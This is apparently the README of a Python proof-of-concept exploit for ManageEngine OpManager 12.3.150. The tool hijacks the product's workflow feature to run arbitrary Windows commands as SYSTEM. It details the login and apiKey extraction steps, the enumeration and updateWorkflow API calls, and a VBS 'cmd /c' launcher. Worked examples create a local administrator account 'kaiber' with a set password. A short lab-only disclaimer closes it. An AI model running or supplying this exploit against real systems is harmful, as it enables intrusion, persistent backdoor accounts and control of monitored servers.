# ManageEngine OpManager Workflow Remote Code Execution
Python3 based command line utility for working with ManageEngine OpManager build number 12.3.150 to abuse the workflows functionality for remote code execution.


It automates:

1. Full web login flow (including `SettingsServlet` and `j_security_check`)
2. Extraction of the OpManager `apiKey` from the Ember UI
3. Enumeration of workflows and devices
4. Selection or reuse of an existing workflow by name
5. Injection of a VBS payload that runs arbitrary Windows commands via `cmd /c`
6. Execution of the workflow against a chosen device
7. Retrieval and display of the command output from workflow execution logs

Tested in a lab context , including:

- Simple commands (`hostname`, `whoami`)
- Multi‑argument commands (`whoami /all`)
- Chained commands (`net user /add kaiber && net localgroup /add administrators kaiber`)

---

## Requirements

- Python 3
- `requests` library (available on Kali by default; otherwise install with `pip install requests`).
- Network access to the OpManager instance.
- Valid OpManager web credentials (e.g. `admin:admin`).

---

## Usage

### Basic exploitation

Run a command via an existing or template workflow:

```bash
./opmanager-rce.py -t http://targetserver/ -u admin -p 'admin' -c "whoami /all" -wf testrce -d targetserver
```

This will:

1. Log in as `admin` to `http://targetserver/`
2. Extract the `apiKey` from `/apiclient/ember/index.jsp`
3. Enumerate devices and select device with `displayName="targetserver"`
4. Enumerate workflows and find workflow named `testrce`
5. Update workflow `testrce` to run `cmd /c whoami /all` via a VBS script
6. Execute that workflow on device `targetserver`
7. Poll `getWorkflowExecutionStatus` and print the command output

Example successful output:

```text
===== Command Output =====
USER INFORMATION
----------------
User Name           SID     
=================== ========
local\IISUsr S-1-5-18
...
==========================
```

---

## Command‑line options

```text
-t, --target           Target base URL (e.g. http://targetserver or http://targetserver.kaiber.local)
-u, --user             Username for login (e.g. admin)
-p, --password         Password for login
-c, --command          Command to run on target (e.g. "whoami /all")
-wf, --workflow-name   Workflow name to use (e.g. "testrce").
                       If it already exists, it will be reused.
                       If it does not exist, base workflow ID is used as template.
-d, --device           Device displayName to target (e.g. "targetserver").
                       If omitted (and not in list-devices mode), the script
                       lists available devices and exits.

--base-workflow-id     Existing workflow ID template to overwrite if named
                       workflow not found (default: 305)

--poll-interval        Seconds between status polls (default: 2.0)
--poll-timeout         Maximum seconds to wait for workflow completion (default: 120)
--filter-id            Filter ID for getDeviceListForFilter (default: 1)

--list-workflows       List workflows and exit (no exploitation)
--list-devices         List devices and exit (no exploitation)
--no-exec              Update the selected workflow but do not execute it
--debug                Enable verbose debug logging (HTTP steps, cookies, etc.)
```

---

## Login and apiKey extraction

The script reproduces the full login sequence observed in browser traffic:

1. `GET /` to obtain an initial `JSESSIONID`
2. `POST /servlets/SettingsServlet?requestType=AJAX&sid=...` with:
   - `EncryptPassword`
   - `userName`
   - `domainName=Authenticator`
   - `autoSignIn=true`
   - `authRuleName=Authenticator`
3. `POST /j_security_check;jsessionid=<JSESSIONID>` with:
   - `AUTHRULE_NAME=Authenticator`
   - `clienttype=html`
   - `ScreenWidth`, `ScreenHeight`
   - `loginFromCookieData=false`
   - `ntlmv2=false`
   - `j_username`, `j_password`
   - `signInAutomatically=on`
4. Final `GET /` to settle the session

Then it requests:

```http
GET /apiclient/ember/index.jsp HTTP/1.1
```

and parses the apiKey from JavaScript:

```js
window.OPM.apiKey = "e9ea1e162f47f8922f130093c612e9fc";
```

This `apiKey` is required for all subsequent `/api/json/...` endpoints.

---

## Device handling

The script discovers devices via:

```http
GET /api/json/device/getDeviceListForFilter?apiKey=<apiKey>&filterID=1&type=workflow
```

Example response:

```json
{
  "selectedDevices": [],
  "remainingDevices": [
    {
      "name": "targetserver.kaiber.local",
      "displayName": "targetserver",
      "moid": "234",
      "category": "Server",
      "type": "Windows 2016"
    }
  ]
}
```

The `-d/--device` option expects the `displayName` (e.g. `targetserver`):

- The script resolves this to `name="targetserver.kaiber.local"` and `moid="234"`.
- `selectedDevices` in the workflow payload uses the `"name"` (`targetserver.kaiber.local`).
- The `executeWorkflow` call uses `deviceName=<moid>` (`234`).

If no `-d` is provided (and not `--list-devices` mode), the script prints the device list JSON and exits.

### Listing devices

```bash
./opmanager-rce.py -t http://targetserver/ -u admin -p 'admin' --list-devices
```

Output:

```json
{
  "selectedDevices": [],
  "remainingDevices": [
    {
      "name": "targetserver.kaiber.local",
      "displayName": "targetserver",
      "moid": "234",
      "category": "Server",
      "type": "Windows 2016"
    }
  ]
}
```

---

## Workflow enumeration and selection

Workflows are retrieved via:

```http
GET /api/json/workflow/getWorkflowList?apiKey=<apiKey>
```

Example data:

```json
[
  {
    "triggerdesc": "Not Available",
    "description": "Description not given for this Workflow",
    "name": "testrce",
    "workflowType": 2,
    "rbID": 305,
    "triggerType": 1,
    "reportID": 90
  },
  ...
]
```

The script:

- Matches workflows by `name` (case‑insensitive).
- Extracts IDs from multiple fields (`wfID`, `id`, `wfId`, `workflowID`, `workflowId`, `rbID`, `rbId`).
- For OpManager, the relevant ID is typically `rbID`, which in the example above is `305`.

If the named workflow is found:

- The script **reuses its actual ID**.
- The payload is pushed to that workflow.

If it is not found:

- The script falls back to `--base-workflow-id` (default `305`).
- That ID is treated as a template to overwrite.

### Listing workflows

```bash
./opmanager-rce.py -t http://targetserver/ -u admin -p 'admin' --list-workflows
```

Example output:

```json
[
  {
    "triggerdesc": "Not Available",
    "description": "Description not given for this Workflow",
    "name": "testrce",
    "workflowType": 2,
    "rbID": 305,
    "triggerType": 1,
    "reportID": 90
  },
  ...
]
```

---

## Payload injection (updateWorkflow)

The exploit modifies the workflow via:

```http
POST /api/json/workflow/updateWorkflow?apiKey=<apiKey>&wfID=<workflow_id>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

jsonData=<url-encoded JSON>
```

`jsonData` contains the full workflow configuration, including the `scriptBody` of the main task. The script builds:

- A simple VBS launcher that:

  ```vbscript
  Option Explicit
  On Error Resume Next

  Dim shell, execObj, result, cmd

  cmd = "cmd /c " & "<escaped_command>"

  Set shell = CreateObject("WScript.Shell")
  Set execObj = shell.Exec(cmd)

  result = ""
  Do Until execObj.StdOut.AtEndOfStream
      result = result & execObj.StdOut.ReadAll()
  Loop

  WScript.Echo result
  ```

- This is embedded into `taskProps.mainTask.scriptBody`.

- The REST of the workflow JSON (trigger details, device selection, criteria, etc.) is preserved in a structure compatible with the original OpManager layout.

You can see the effect by first updating only, without execution:

```bash
./opmanager-rce.py -t http://targetserver/ -u admin -p 'admin' -c "whoami /all" -wf testrce -d targetserver --no-exec
```

This updates the workflow, but leaves execution to the GUI or a separate run.

---

## Execution and output retrieval

The script then triggers the workflow via:

```http
POST /api/json/workflow/executeWorkflow?apiKey=<apiKey>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

wfID=<workflow_id>&deviceName=<device_moid>&triggerType=1
```

Typical response:

```json
[21]
```

The exploit interprets that as `executionID=21`, then polls:

```http
GET /api/json/workflow/getWorkflowExecutionStatus?apiKey=<apiKey>&executionID=21
```

Example response:

```json
[{
  "id": "21",
  "status": "COMPLETED",
  "exectionlogs": {
    "21": {
      "moID": 234,
      "logData": [
        {
          "taskName": "Execute Windows Script",
          "logSeverity": 5,
          "logMessage": "Script has been executed successfully."
        },
        {
          "taskName": "Execute Windows Script",
          "logSeverity": 5,
          "logMessage": "Script output:\nnt authority\\system\n"
        }
      ],
      "rbName": "testrce",
      "displayName": "targetserver",
      "logSeverity": 5,
      "logMessage": "Workflow has been executed successfully."
    }
  }
}]
```

The exploit:

- Uses `status` for completion (`COMPLETED`, `FAILED`, `SUCCESS`).
- Walks `exectionlogs[executionID].logData[*].logMessage`.
- Looks specifically for a message containing `"Script output:"`.
- Strips the prefix and prints the remainder as the command output.

If no `Script output:` entry is present, it will fall back to concatenating `logMessage` values, but the primary path is the `Script output:` log.

---

## Example: creating an admin user on the target host

### 1) Create and privilege the user

```bash
./opmanager-rce.py -t http://targetserver/ -u admin -p 'admin' -c "net user /add kaiber Password12345 && net localgroup /add administrators kaiber" -wf testrce -d targetserver --debug
```

Relevant part of the output:

```text
===== Command Output =====
The command completed successfully.

The command completed successfully.
==========================
```

This indicates:

- `net user /add kaiber Password12345` succeeded
- `net localgroup /add administrators kaiber` succeeded

### 2) Verify the new user exists

```bash
./opmanager-rce.py -t http://targetserver/  -u admin -p 'admin' -c "net users" -wf testrce -d targetserver --debug
```

Example `Command Output`:

```text
===== Command Output =====
User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
exmachina          kaiber                   
The command completed with one or more errors.
==========================
```

The presence of `kaiber` in the list confirms successful account creation and, from the previous step, membership in the local Administrators group.

---

## Debugging with `--debug`

Use `--debug` to see:

- Each HTTP step and status
- Cookie changes between requests
- Truncated response bodies for key endpoints
- Raw workflow/device JSON in edge cases

Example:

```bash
./opmanager-rce.py -t http://targetserver/  -u admin -p 'admin' -c "whoami" -wf testrce -d targetserver --debug
```

This is particularly useful when:

- The apiKey extraction pattern needs to be adapted.
- The workflow list JSON has a slightly different structure.
- New OpManager versions change field names or response formats.

---

## Notes and limitations

- This is an **authenticated** exploit: you need valid OpManager credentials.
- This has only been configured to work against Windows machines, OpManager in this build utilises a different type of workflow for Linux machines and thus would need additional functionality to handle Linux targets too.
- It relies on a specific workflow structure and logging behaviour:
  - A task named `"Execute Windows Script"`.
  - Output logged as `"Script output:\n<...>"`.
- It assumes the OpManager instance is reachable from the attacking machine and that workflows can be executed on the chosen device.
- For very large command outputs, OpManager may truncate logs; the exploit will still work, but you may not see the full output.

---

## Safety and lab usage

This PoC is designed for controlled lab environments. Using it against systems without explicit permission is illegal and unethical.

For Lab environments and engagements, the script provides a clear, reproducible chain:

1. Login and apiKey extraction
2. Enumeration (`--list-workflows`, `--list-devices`)
3. Workflow hijack (`-wf`, `--base-workflow-id`)
4. Command execution and proof via logs

You can embed the command outputs you’ve captured (such as `whoami /all` and `net users`) directly in your report to demonstrate successful exploitation and privilege level.